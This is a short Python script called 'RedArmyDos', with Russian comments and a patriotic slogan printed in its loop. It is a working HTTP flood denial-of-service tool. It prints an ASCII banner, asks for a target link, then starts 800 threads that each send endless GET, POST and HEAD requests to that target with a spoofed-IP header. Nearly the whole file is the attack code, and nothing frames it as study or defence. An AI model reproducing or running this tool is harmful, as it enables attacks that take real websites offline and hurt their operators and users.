import requests
from threading import Thread
import random

#настройки
FakeIp = '92.223.109.96'

user = [FakeIp]

headers = {'0': random.choice(user)}

wl = [
	'PPPPPPPPPPPPPPPPPPPPPPPPP',
	'PPPPPPPPPPPPPP    PPPPPPP',
	'PPPPPPP   PPPPPPP  PPPPPP',
	'PPPPP     PPPPPPPP  PPPPP',
	'PPP       PPPPPPPPP  PPPP',
	'PPPPPPPPP   PPPPPPPP  PPP',
	'PPPPPPPPPPP   PPPPPP   PP',
	'PPPPPPPPPPPPP   PPPP   PP',
	'PPPPPPPPPPPPPPP   PP  PPP',
	'PPPPP     PPPPPPP    PPPP',
	'PPP  PPPPP            PPP',
	'P   PPPPPPPPPPPPPPPPP  PP',
	'PPPPPPPPPPPPPPPPPPPPPPPPP'
]

#работа
print(wl[0])
print(wl[1])
print(wl[2])
print(wl[3])
print(wl[4])
print(wl[5])
print(wl[6])
print(wl[7])
print(wl[8])
print(wl[9])
print(wl[10])
print(wl[11])
print(wl[12])
print('RedArmyDos')
adres = str(input('link:'))
def send():
	while True:
		requests.get(adres, headers=headers)
		print('Красная армия всех сильней!')
		requests.post(adres, headers=headers)
		print('Красная армия всех сильней!')
		requests.head(adres, headers=headers)
		print('Красная армия всех сильней!')

if __name__ == '__main__':
	for i in range(800):
		thr = Thread(target=send)
		thr.start()